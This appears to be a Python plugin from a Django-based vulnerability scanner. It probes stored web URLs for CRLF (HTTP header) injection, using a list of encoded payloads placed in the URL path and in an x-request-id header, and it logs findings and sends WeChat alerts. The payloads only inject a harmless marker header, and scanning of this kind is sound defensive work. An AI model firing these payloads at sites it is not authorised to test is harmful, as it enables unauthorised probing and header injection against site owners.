"""
x-request-id，客户端随机生成，用于方便服务端排查日志，代替时间戳和IP等；
很多服务端返回了该http头，但是将特殊字符过滤掉；
"""
import requests
from apps.webapps.models import WebUrls
from apps.assets.models import Risk
from lib.common import url_is_ip
import urllib3
from lib.wechat_notice import wechat
from lib.common import update_scan_status
from loguru import logger
from multiprocessing.dummy import Pool as ThreadPool
from django.conf import settings

urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

plugin = 'crlf'

payloads = ['%0d%0adandh811:dandh811',
            '%0adandh811:dandh811',
            '%0ddandh811:dandh811',
            '%E5%98%8A%E5%98%8Ddandh811:dandh811',
            '%23%0ddandh811:dandh811',
            '%3f%0ddandh811:dandh811',
            '/%250adandh811:dandh811',
            '/%%0a0adandh811:dandh811',
            '/%3f%0ddandh811:dandh811',
            '/%23%0ddandh811:dandh811',
            '/%25%30adandh811:dandh811',
            '/%25%30%61dandh811:dandh811',
            '/%u000adandh811:dandh811'
            ]


def start(**kwargs):
    webapps = kwargs['webapps']
    policy = kwargs['policy']
    if policy == 'increase':
        weburls = WebUrls.objects.exclude(scanned__icontains='crlf').order_by('-id')
        webapps = webapps.exclude(scanned__icontains=plugin).order_by('-id')
    else:
        weburls = WebUrls.objects.order_by('-id')
    if not weburls:
        logger.debug("[%s] %s" % (plugin, '未匹配到扫描对象'))
    try:
        pool = ThreadPool(20)
        pool.map(check, webapps)
        pool.close()
        pool.join()
    except Exception as e:
        logger.critical(e)

    try:
        pool = ThreadPool(20)
        pool.map(check, weburls)
        pool.close()
        pool.join()
    except Exception as e:
        logger.critical(e)


def check(obj):
    try:
        url = obj.url
    except:
        url = obj.subdomain + '/'
    if url_is_ip(url):
        return
    for payload in payloads:
        _url = url + payload
        logger.debug("[%s] [%s] %s" % (plugin, obj.id, _url))

        headers = settings.HTTP_HEADERS
        try:
            res = requests.get(_url, headers=headers, timeout=10, verify=False, allow_redirects=False)
        except Exception as e:
            # logger.error(e)
            res = None
        if res:
            try:
                if 'dandh811' in res.headers.keys():
                    logger.info('[$$$] %s , 该域名存在漏洞' % _url)

                    Risk.objects.update_or_create(target=url, risk_type='CRLF注入', defaults={"desc": _url + '\n' + payload})
                    title = '发现HTTP头注入漏洞'
                    content = _url
                    wechat.send_msg(title, content)
            except Exception as e:
                logger.critical(e)

        try:
            headers["x-request-id"] = 'test' + payload
            res = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
        except Exception as e:
            continue
        try:
            if 'dandh811' in res.headers.keys():
                Risk.objects.update_or_create(target=url, risk_type='CRLF注入', defaults={"desc": _url + '\n' + payload})
                logger.info('success, 该域名存在漏洞')
                title = '发现HTTP头注入漏洞'
                content = _url
                wechat.send_msg(title, content)

        except Exception as e:
            logger.critical(e)

    update_scan_status(obj, plugin)
